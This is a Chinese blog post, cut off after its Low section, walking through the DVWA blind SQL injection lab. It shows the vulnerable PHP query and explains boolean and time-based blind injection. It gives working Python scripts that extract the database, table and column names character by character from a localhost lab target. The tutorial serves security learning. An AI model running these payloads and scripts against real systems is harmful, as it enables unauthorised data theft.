@@ -1,0 +1,686 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta http-equiv="Content-Language" content="zh-cn">
+    <meta charset="utf-8">
+    
+    
+    
+    <title>dvwa-sql(blind) | Somnus&#39;s blog</title>
+    <meta name="viewport" content="width=device-width,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no">
+    
+    <meta name="theme-color" content="#77AAFF">
+    
+    
+    <meta name="keywords" content="sql">
+    
+    
+
+    
+
+    <!-- Baidu Push -->
+<script>
+	(function(){
+		var bp = document.createElement('script');
+		var curProtocol = window.location.protocol.split(':')[0];
+		if (curProtocol === 'https') {
+			bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+		}
+		else {
+			bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+		}
+		var s = document.getElementsByTagName("script")[0];
+		s.parentNode.insertBefore(bp, s);
+	})();
+
+	var _hmt = _hmt || [];
+</script>
+
+
+
+    
+    <meta name="description" content="dvwa-sql">
+<meta name="keywords" content="sql">
+<meta property="og:type" content="article">
+<meta property="og:title" content="dvwa-sql(blind)">
+<meta property="og:url" content="https://Foxgrin.github.io/posts/55409/index.html">
+<meta property="og:site_name" content="Somnus&#39;s blog">
+<meta property="og:description" content="dvwa-sql">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://foxgrin.github.io/img/dvwa-sql(blind)/1.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/dvwa-sql(blind)/2.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/dvwa-sql(blind)/3.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/dvwa-sql(blind)/4.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/dvwa-sql(blind)/5.png">
+<meta property="og:updated_time" content="2018-07-11T10:36:59.664Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="dvwa-sql(blind)">
+<meta name="twitter:description" content="dvwa-sql">
+<meta name="twitter:image" content="https://foxgrin.github.io/img/dvwa-sql(blind)/1.png">
+    
+        <link rel="alternate" type="application/atom+xml" title="Somnus&#39;s blog" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/img/favicon.ico">
+    <link id="style" rel="stylesheet" href="/css/style.css?v=3.0">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+            
+</head>
+
+<body>
+    <div id="loading" class="active"></div>
+    <aside id="menu"  class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" >
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/touxiang/1.jpg" alt="avatar">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname" id="name">Somnus</h5>
+          
+            <div id="yiyanmotto" class="motto">&nbsp;</div>
+          
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+              <li class="waves-block waves-effect">
+                  <a href="/"  >
+                    <i class="icon icon-lg icon-home"></i>
+                    <span>主 页</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+              <li class="waves-block waves-effect">
+                  <a href="/archives"  >
+                    <i class="icon icon-lg icon-archives"></i>
+                    <span>归 档</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+              <li class="waves-block waves-effect">
+                  <a href="/categories"  >
+                    <i class="icon icon-lg icon-th-list"></i>
+                    <span>分 类</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+              <li class="waves-block waves-effect">
+                  <a href="/tags"  >
+                    <i class="icon icon-lg icon-tags"></i>
+                    <span>标 签</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+              <li class="waves-block waves-effect">
+                  <a href="/about"  >
+                    <i class="icon icon-lg icon-smile-o"></i>
+                    <span>关 于</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+      <div class="nav2">
+          
+              <a class="nav2item" data-title="Email" href="mailto:823263808@qq.com" target="_parent"title="Email" >
+                <i class="icon icon-lg icon-envelope-o envelope-o"></i>
+              </a>
+          
+              <a class="nav2item" data-title="Github" href="https://github.com/Foxgrin" target="_blank"title="Github" >
+                <i class="icon icon-lg icon-github github"></i>
+              </a>
+          
+              <a class="nav2item" data-title="微博" href="https://weibo.com/u/6018528806" target="_blank"title="微博" >
+                <i class="icon icon-lg icon-weibo weibo"></i>
+              </a>
+          
+
+            </div>
+        
+      </ul>
+        
+    </div>
+  </div>
+ 
+</aside>
+
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">dvwa-sql(blind)</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        <a href="../../atom.xml" target="_blank" class="header-icon waves-effect waves-circle waves-light" id="Rss">
+            <i class="icon icon-lg icon-rss"></i>
+        </a>
+    </div>
+</header>
+<header class="content-header post-header">
+    
+    
+    <div class="container fade-scale">
+        <div id="myheader">
+            <h1 class="title">
+                
+            </h1>
+            <h5 class="subtitle">
+                
+                
+            </h5>
+        </div>
+    </div>
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Low"><span class="post-toc-number">1.</span> <span class="post-toc-text">Low</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Medium"><span class="post-toc-number">2.</span> <span class="post-toc-text">Medium</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#High"><span class="post-toc-number">3.</span> <span class="post-toc-text">High</span></a></li></ol>
+        </nav>
+    </aside>
+   
+<article id="post-dvwa-sql(blind)"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">dvwa-sql(blind)</h1>
+        <div class="post-meta">
+            <i class="icon icon-lg icon-calendar-o"></i>
+            发表于
+            <time class="post-time" title="2018-07-11 15:39:00" datetime="2018-07-11T07:39:00.000Z"  itemprop="datePublished">2018-07-11</time>
+
+            <br id="mybreak"/>
+            
+	<i class="icon icon-lg icon-folder-o"></i>
+	分类：<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/dvwa-sql/">dvwa-sql</a></li></ul>
+
+
+            <i>·</i>
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>次浏览
+</span>
+
+
+        </div>
+        <div class="post-count-custom">
+            <i class="icon icon-lg icon-comment-o"></i>
+            阅读本文可能花费您&nbsp;<span class="post-count">15</span>&nbsp;分钟
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <p>总结了dvwa中的sql盲注关卡<a id="more"></a></p>
+<h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><p>代码复现如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">include(&quot;sql-connection.php&quot;);</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&apos;id&apos;]) &amp;&amp; isset($_POST[&apos;submit&apos;]))&#123;</span><br><span class="line">	$id=$_POST[&apos;id&apos;];</span><br><span class="line">	$sql=&quot;SELECT first_name , last_name FROM users WHERE user_id=&apos;$id&apos;&quot;;</span><br><span class="line">	$result=mysql_query($sql);</span><br><span class="line">	$row=mysql_fetch_array($result);</span><br><span class="line">	if($row)&#123;</span><br><span class="line">		echo &apos;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&apos;;</span><br><span class="line">	&#125;</span><br><span class="line">	else&#123;</span><br><span class="line">		echo &apos;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&apos;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>所谓的盲注，就是既没有报错信息，查询结果也始终如一甚至没有查询结果，也就是我们不知道会得到什么结果</p>
+<p>我们就不能像之前一样自由选择注入方法，没有报错信息，也就是说报错注入不能用</p>
+<p>没有查询结果，也就是说联合注入不能用</p>
+<p>剩下的也就是盲注</p>
+<p>盲注又可以分为基于时间的盲注和布尔型的盲注</p>
+<p>从源代码来看，这关没有报错信息，查询结果为空和不为空返回的信息是不同的，我们就可以利用返回信息来判断有无返回结果</p>
+<p>我们先输入1，发现有返回结果</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/dvwa-sql(blind)/1.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>再输入1’，发现没有返回结果</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/dvwa-sql(blind)/2.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>输入1’#，发现有返回结果</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/dvwa-sql(blind)/3.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>说明id被单引号包裹，然后1是有查询结果的，然后我们就可以通用 1’ and 后面的语句进行盲注</p>
+<p>and 后面的语句如果为真，则有返回结果，and 后面语句为假，则没有返回结果，我们可以在mysql命令行里先试着模拟注入语句</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/dvwa-sql(blind)/4.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>把and后面的语句修改为注入的逻辑语句，这就是布尔型的盲注，举个例子，我们可以用布尔型盲注判断数据库名字的长度</p>
+<p>输入1’ and length(database())=4#</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/dvwa-sql(blind)/5.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>而另一种基于时间的盲注，则是通过if(判断语句,1,sleep(5))来进行注入，如果判断语句为真，则不会sleep，为假则sleep 5秒</p>
+<p>但是盲注的缺点就是一条一条试太麻烦了，这时候脚本的作用就体现出来了</p>
+<p>我们先通过基于时间的盲注获取数据库名的长度</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">11</span>):</span><br><span class="line">    data=&#123;</span><br><span class="line">        <span class="string">'id'</span>:<span class="string">"1' and if(length(database())=%d,1,sleep(5))#"</span>%i,</span><br><span class="line">        <span class="string">'submit'</span>:<span class="string">'Submit'</span></span><br><span class="line">        &#125;</span><br><span class="line">    r=requests.post(url,data=data)</span><br><span class="line">    t=r.elapsed.total_seconds()</span><br><span class="line">    <span class="keyword">if</span>(t&lt;<span class="number">5</span>):</span><br><span class="line">        database_length=i</span><br><span class="line">        print(<span class="string">'The length of database is:'</span>,database_length)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+<p>这里r.elapsed.total_seconds()函数的作用是返回服务器接受请求到相应之间的时间，如果我们的判断语句length(database())=i 结果为真，则就不会sleep 5秒，t自然就小于5，就得到了数据库的长度</p>
+<p>有了数据库名的长度，就可以获取数据库名</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">5</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">95</span>,<span class="number">123</span>):</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">'id'</span>:<span class="string">"1' and if(ascii(substr(database(),%d,1))=%d,1,sleep(5))#"</span>%(i,j),</span><br><span class="line">            <span class="string">'submit'</span>:<span class="string">'Submit'</span></span><br><span class="line">            &#125;</span><br><span class="line">        r=requests.post(url,data=data)</span><br><span class="line">        t=r.elapsed.total_seconds()</span><br><span class="line">        print(<span class="string">'the time of'</span>,chr(j),<span class="string">'is'</span>,t)</span><br><span class="line">        <span class="keyword">if</span>(t&lt;<span class="number">5</span>):</span><br><span class="line">            database=database+chr(j)</span><br><span class="line">            print(<span class="string">'The name of database is:'</span>,database)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+<p>先获取数据库名长度的作用就是用来一位一位的截取数据库名的字符进行判断，如果等于一个ascii值则t&lt;5，这样一位一位的得到数据库名的字符</p>
+<p>同样的方法获取数据表的长度</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">5</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">95</span>,<span class="number">123</span>):</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">'id'</span>:<span class="string">"1' and if(ascii(substr(database(),%d,1))=%d,1,sleep(5))#"</span>%(i,j),</span><br><span class="line">            <span class="string">'submit'</span>:<span class="string">'Submit'</span></span><br><span class="line">            &#125;</span><br><span class="line">        r=requests.post(url,data=data)</span><br><span class="line">        t=r.elapsed.total_seconds()</span><br><span class="line">        print(<span class="string">'the time of'</span>,chr(j),<span class="string">'is'</span>,t)</span><br><span class="line">        <span class="keyword">if</span>(t&lt;<span class="number">5</span>):</span><br><span class="line">            database=database+chr(j)</span><br><span class="line">            print(<span class="string">'The name of database is:'</span>,database)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+<p>获取数据表名：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">16</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">95</span>,<span class="number">123</span>):</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">'id'</span>:<span class="string">"1' and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),%d,1))=%d,1,sleep(3))#"</span>%(i,j),</span><br><span class="line">            <span class="string">'submit'</span>:<span class="string">'Submit'</span></span><br><span class="line">            &#125;</span><br><span class="line">        r=requests.post(url,data=data)</span><br><span class="line">        t=r.elapsed.total_seconds()</span><br><span class="line">        print(<span class="string">'the time of'</span>,chr(j),<span class="string">'is:'</span>,t)</span><br><span class="line">        <span class="keyword">if</span>(t&lt;<span class="number">3</span>):</span><br><span class="line">            table_name=table_name+chr(j)</span><br><span class="line">            print(<span class="string">'The name of table is:'</span>,table_name)</span><br><span class="line">            flag=<span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span>(j==<span class="number">122</span>):</span><br><span class="line">                table_name=table_name+<span class="string">','</span></span><br></pre></td></tr></table></figure>
+<p>获取users表下数据列总长度：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">90</span>,<span class="number">100</span>):</span><br><span class="line">    data=&#123;</span><br><span class="line">        <span class="string">'id'</span>:<span class="string">"1' and length((select group_concat(column_name) from information_schema.columns where table_name='users'))=%d#"</span>%i,</span><br><span class="line">        <span class="string">'submit'</span>:<span class="string">'Submit'</span></span><br><span class="line">        &#125;</span><br><span class="line">    r=requests.post(url,data=data)</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">'User ID exists in the database.'</span> <span class="keyword">in</span> r.text):</span><br><span class="line">        column_length=i</span><br><span class="line">        print(column_length)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+<p>这里用了布尔型的盲注，由于数据列总长度可能较长，所以变量i的区间是通过反复尝试出来的</p>
+<p>获取数据列名：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">95</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">95</span>,<span class="number">123</span>):</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">'id'</span>:<span class="string">"1' and ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='users'),%d,1))=%d#"</span>%(i,j),</span><br><span class="line">            <span class="string">'submit'</span>:<span class="string">'Submit'</span></span><br><span class="line">            &#125;</span><br><span class="line">        r=requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">'User ID exists in the database.'</span> <span class="keyword">in</span> r.text):</span><br><span class="line">            column_name=column_name+chr(j)</span><br><span class="line">            print(<span class="string">"The name of column is:"</span>,column_name)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span>(j==<span class="number">122</span>):</span><br><span class="line">                column_name=column_name+<span class="string">','</span></span><br></pre></td></tr></table></figure>
+<p>总结：大部分sql注入都是得不到想要的结果，也没有报错信息的，所以大部分情况下我们都要进行盲注，而盲注就强烈推荐使用脚本，可以非常好的节约时间和精力</p>
+<p>下面贴上本关完整的脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">'http://127.0.0.1/demo/sqli(blind)-low.php'</span></span><br><span class="line">database_length=<span class="number">0</span></span><br><span class="line">table_length=<span class="number">0</span></span><br><span class="line">column_length=<span class="number">0</span></span><br><span class="line">database=<span class="string">''</span></span><br><span class="line">table_name=<span class="string">''</span></span><br><span class="line">column_name=<span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#获取数据库长度:4</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">11</span>):</span><br><span class="line">    data=&#123;</span><br><span class="line">        <span class="string">'id'</span>:<span class="string">"1' and if(length(database())=%d,1,sleep(5))#"</span>%i,</span><br><span class="line">        <span class="string">'submit'</span>:<span class="string">'Submit'</span></span><br><span class="line">        &#125;</span><br><span class="line">    r=requests.post(url,data=data)</span><br><span class="line">    t=r.elapsed.total_seconds()</span><br><span class="line">    <span class="keyword">if</span>(t&lt;<span class="number">5</span>):</span><br><span class="line">        database_length=i</span><br><span class="line">        print(<span class="string">'The length of database is:'</span>,database_length)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#获取数据库名:dvwa</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">5</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">95</span>,<span class="number">123</span>):</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">'id'</span>:<span class="string">"1' and if(ascii(substr(database(),%d,1))=%d,1,sleep(5))#"</span>%(i,j),</span><br><span class="line">            <span class="string">'submit'</span>:<span class="string">'Submit'</span></span><br><span class="line">            &#125;</span><br><span class="line">        r=requests.post(url,data=data)</span><br><span class="line">        t=r.elapsed.total_seconds()</span><br><span class="line">        print(<span class="string">'the time of'</span>,chr(j),<span class="string">'is'</span>,t)</span><br><span class="line">        <span class="keyword">if</span>(t&lt;<span class="number">5</span>):</span><br><span class="line">            database=database+chr(j)</span><br><span class="line">            print(<span class="string">'The name of database is:'</span>,database)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#获取所有数据表总长度:15</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">11</span>,<span class="number">16</span>):</span><br><span class="line">    data=&#123;</span><br><span class="line">        <span class="string">'id'</span>:<span class="string">"1' and if(length((select group_concat(table_name) from information_schema.tables where table_schema=database()))=%d,1,sleep(5))#"</span>%i,</span><br><span class="line">        <span class="string">'submit'</span>:<span class="string">'Submit'</span></span><br><span class="line">        &#125;</span><br><span class="line">    r=requests.post(url,data=data)</span><br><span class="line">    t=r.elapsed.total_seconds()</span><br><span class="line">    print(t)</span><br><span class="line">    <span class="keyword">if</span>(t&lt;<span class="number">5</span>):</span><br><span class="line">        table_length=i</span><br><span class="line">        print(<span class="string">'The length of table is:'</span>,table_length)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#获取所有数据表名:guestbook,users</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">16</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">95</span>,<span class="number">123</span>):</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">'id'</span>:<span class="string">"1' and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),%d,1))=%d,1,sleep(3))#"</span>%(i,j),</span><br><span class="line">            <span class="string">'submit'</span>:<span class="string">'Submit'</span></span><br><span class="line">            &#125;</span><br><span class="line">        r=requests.post(url,data=data)</span><br><span class="line">        t=r.elapsed.total_seconds()</span><br><span class="line">        print(<span class="string">'the time of'</span>,chr(j),<span class="string">'is:'</span>,t)</span><br><span class="line">        <span class="keyword">if</span>(t&lt;<span class="number">3</span>):</span><br><span class="line">            table_name=table_name+chr(j)</span><br><span class="line">            print(<span class="string">'The name of table is:'</span>,table_name)</span><br><span class="line">            flag=<span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span>(j==<span class="number">122</span>):</span><br><span class="line">                table_name=table_name+<span class="string">','</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#获取所有数据列总长度:94</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">90</span>,<span class="number">100</span>):</span><br><span class="line">    data=&#123;</span><br><span class="line">        <span class="string">'id'</span>:<span class="string">"1' and length((select group_concat(column_name) from information_schema.columns where table_name='users'))=%d#"</span>%i,</span><br><span class="line">        <span class="string">'submit'</span>:<span class="string">'Submit'</span></span><br><span class="line">        &#125;</span><br><span class="line">    r=requests.post(url,data=data)</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">'User ID exists in the database.'</span> <span class="keyword">in</span> r.text):</span><br><span class="line">        column_length=i</span><br><span class="line">        print(column_length)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#获取所有数据列名:user_id,first_name,last_name,user,password,avatar,last_login,failed_login,id,username,password</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">95</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">95</span>,<span class="number">123</span>):</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">'id'</span>:<span class="string">"1' and ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='users'),%d,1))=%d#"</span>%(i,j),</span><br><span class="line">            <span class="string">'submit'</span>:<span class="string">'Submit'</span></span><br><span class="line">            &#125;</span><br><span class="line">        r=requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">'User ID exists in the database.'</span> <span class="keyword">in</span> r.text):</span><br><span class="line">            column_name=column_name+chr(j)</span><br><span class="line">            print(<span class="string">"The name of column is:"</span>,column_name)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span>(j==<span class="number">122</span>):</span><br><span class="line">                column_name=column_name+<span class="string">','</span></span><br></pre></td></tr></table></figure>
+<h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><p>代码复现如下：</p>
